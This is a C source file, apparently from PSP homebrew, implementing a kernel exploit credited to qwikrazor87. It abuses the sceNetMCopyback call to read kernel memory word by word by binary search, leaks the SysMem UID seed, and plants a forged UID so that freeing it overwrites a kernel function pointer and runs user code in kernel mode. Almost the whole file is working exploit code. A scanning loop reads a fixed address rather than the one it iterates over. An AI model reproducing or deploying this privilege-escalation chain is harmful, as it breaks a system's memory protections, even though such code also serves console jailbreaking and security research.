#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

/*
SceUID kernel exploit and read only kernel exploit by qwikrazor87.
*/

// Two's complement MAX and MIN values
#define HIGHEST 0x7FFFFFFF
#define LOWEST 0x80000000

// initialize arg0 for a positive value
#define MAKE_ARGS_POS(args, kptr) { \
	args.next = (LinkedList*)((u8*)kptr - 12); \
	args.count = 0; \
	args.check = 2; \
	args.flag = -1; \
}

// initialize arg0 for a negative value
#define MAKE_ARGS_NEG(args, kptr) { \
	args.next = (LinkedList*)((u8*)kptr - 12); \
	args.count = LOWEST+1; \
	args.check = 2; \
	args.flag = LOWEST; \
}

#define ABS(x) ((x<0)? -1*x:x)

#define DUMP_PATH "ms0:/kram.bin"
#define BUF_SIZE 10*1024 // 10KB buffer to minimize IO

#define LIBC_CLOCK_OFFSET  0x88014D80 //0x88014D00
#define SYSMEM_SEED_OFFSET 0x88014EB8 //0x88014E38
#define FAKE_UID_OFFSET    0x8814CFA8

FunctionTable* g_tbl;

// Reverse Engineer of the structure passed as arg0
typedef struct LinkedList{
	struct LinkedList* next; // a0+0  -> kptr-12
	u32 unk0; // a0+4
	u32 unk1; // a0+8
	u32 count; // a0+12 -> stored in arg0.flag if *kptr >= arg1
	u16 unk2; // a0+16
	u16 check; // a0+18 -> needs to be 2 to pass some checks
	u32 unk3; // a0+20
	u32 flag; // a0+24 -> will change depending on value in kram
}LinkedList;

u32 (*_sceNetMCopyback)(void*, u32, u32, u32) = NULL;

/* Actual code to trigger the kram read vulnerability.
	We can read the value stored at any location in Kram.
*/
u32 readKram(void* kptr){
	LinkedList arg0; // fucked up structure :D
	u32 arg1 = 0; // data in kram we will try to guess, initially 0 for Newton method
	u32 arg2 = 0; // needs to be 0
	u32 arg3 = 1; // needs to be != 0
	
	/*
		if (*kptr >= arg1) arg0.flag = arg0.count;
		use Newton method to figure out the result in O(logn) time; max 5 iterations :D
	*/
	u32 high = HIGHEST;
	u32 low = LOWEST;
	u32 flag;
	do{
		// issue call and check result
		if ((s32)arg1 < 0){ // negative value
			MAKE_ARGS_NEG(arg0, kptr);
			flag = arg0.flag;
			_sceNetMCopyback(&arg0, arg1+arg0.count, arg2, arg3);
		}
		else{ // positive value
			MAKE_ARGS_POS(arg0, kptr);
			flag = arg0.flag;
			_sceNetMCopyback(&arg0, arg1, arg2, arg3);
		}
		if (arg0.flag != flag){ // check if flag has changed
			low = arg1;
		}
		else{
			high = arg1;
		}
		arg1 = (high+low)/2; // calculate next attempt
	}while (ABS(high-low) > 1); // iterate until the difference is 1
	return low;
}

void dumpKram(){
	SceUID fd = g_tbl->IoOpen(DUMP_PATH, PSP_O_CREAT | PSP_O_TRUNC | PSP_O_WRONLY, 0777);
	if (fd < 0){
		return;
	}
	
	u32 kptr = 0x88000000;
	u32 size = 0x400000;
	u32 i;
	static u32 buf[BUF_SIZE];
	u32 count = 0;
	for (i=0; i<size; i+=4){
		u32 val = readKram((void*)(kptr+i));
		if (count >= BUF_SIZE){
			count = 0;
			g_tbl->IoWrite(fd, buf, sizeof(buf));
		}
		buf[count++] = val;
	}
	if (count > 0){
		g_tbl->IoWrite(fd, buf, count*sizeof(u32));
	}
	g_tbl->IoClose(fd);
}

void repairInstruction(KernelFunctions* k_tbl) {
    SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
    //_sw(mod->text_addr + 0x3904, LIBC_CLOCK_OFFSET);
    k_tbl->KernelIcacheInvalidateAll();
    k_tbl->KernelDcacheWritebackInvalidateAll(); 
}

int stubScanner(FunctionTable* tbl){
    g_tbl = tbl;
    
    if (g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON) < 0)
        return -1;

    if (g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON) < 0)
        return -2;

    if (g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET) < 0)
        return -3;
    
    _sceNetMCopyback = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);
    if (_sceNetMCopyback == NULL) return -4;
    
    return 0;
}

int doExploit(void) {

    //PRTSTR("Dumping kram");
    //dumpKram();
    //PRTSTR("kram dumped");

    int res;

    u32 seed = readKram(SYSMEM_SEED_OFFSET);
    PRTSTR1("Seed: %p", seed);
    if (!seed)
        return -1;

    SceUID uid = (((FAKE_UID_OFFSET & 0x00ffffff) >> 2) << 7) | 0x1;
    SceUID encrypted_uid = uid ^ seed;

    // Allocate dummy block to improve reliability
    char dummy[32];
    memset(dummy, 'a', sizeof(dummy));
    SceUID dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_Low, 0x10, NULL);

    // Plant UID data structure into kernel as string
    u32 string[] = { LIBC_CLOCK_OFFSET - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);

    for (u32 a=0x88010000; a<0x88017000; a+=4){
        u32 data = readKram(SYSMEM_SEED_OFFSET);
        if (data == encrypted_uid){
            PRTSTR1("Found fake uid at: %p", a);
        }
        else if (data == 0x61616161){
            PRTSTR1("Found dummy block at: %p", a);
        }
    }

    g_tbl->KernelDcacheWritebackAll();

    // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
    res = g_tbl->KernelFreePartitionMemory(uid);

    g_tbl->KernelFreePartitionMemory(plantid);
    g_tbl->KernelFreePartitionMemory(dummyid);

    g_tbl->UtilityUnloadModule(PSP_MODULE_NET_INET);
    g_tbl->UtilityUnloadModule(PSP_MODULE_NET_COMMON);
    g_tbl->UtilityUnloadModule(PSP_MODULE_NP_COMMON);

    if (res < 0)
        return res;
        
    return 0;
}

void executeKernel(u32 kernelContentFunction){
  // Make a jump to kernel function
  _sw(JUMP(KERNELIFY(kernelContentFunction)), 0x08888888);
  _sw(NOP, 0x08888888+4);
  g_tbl->KernelDcacheWritebackAll();

  // Execute kernel function
  g_tbl->KernelLibcClock();
}
